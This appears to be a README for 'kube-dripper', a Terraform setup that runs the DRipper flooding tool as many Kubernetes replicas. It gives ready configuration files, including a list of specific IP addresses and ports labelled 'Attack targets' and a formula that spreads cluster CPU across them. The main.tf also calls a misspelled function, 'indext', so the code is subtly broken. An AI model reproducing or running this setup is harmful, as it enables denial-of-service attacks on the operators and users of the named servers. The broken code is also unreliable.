# kube-dripper
DRipper batch deploy on Kubernetes via Terraform

## how to use it

I'm assuming you already have a Kubernetes cluster running somewhere, if not - get one!

You need to create a `provider.tf`:
```terraform
provider "kubernetes" {
  config_path = "~/.kube/config"
}
```

Copy [variables.tf](variables.tf) to your folder.

Create `terraform.tfvars`:
```terraform
######################################################################################################
# Kubernetes
######################################################################################################
vcpus_per_node = 4
memory_per_node = 16
node_pool_size = 5

######################################################################################################
# Attack targets
######################################################################################################
attack_hosts = [
  "217.12.104.100,80,100,http",
  "92.38.145.145,80,100,http",
  "92.38.145.145,443,100,http",
  "92.38.145.145,444,100,http"
]
```

Then create `main.tf` with the following content:
```terraform
module "ripper_deployment" {
  source = "./modules/v1_deployment"
  for_each = toset(var.attack_hosts)

  deployment_name = "ripper-${indext(var.attack_hosts, each.value)}-deployment"
  namespace = "default"
  
  ripper_attack_host = split(",", each.value)[0]
  ripper_attack_port = split(",", each.value)[1]
  thread_count       = split(",", each.value)[2]
  attack_method      = split(",", each.value)[3]

  number_of_replicas = (var.vcpus_per_node / 0.5 * var.node_pool_size) / length(var.attack_hosts)
}
```

`attack_hosts` is a list of comma-separated values: `<host>,<port>,<thread_count>,<attack_type>`, for instance:
```terraform
attack_hosts = [
  "217.12.104.100,80,100,http",
  "92.38.145.145,80,100,http",
  "92.38.145.145,443,100,http",
  "92.38.145.145,444,100,http"
]
```
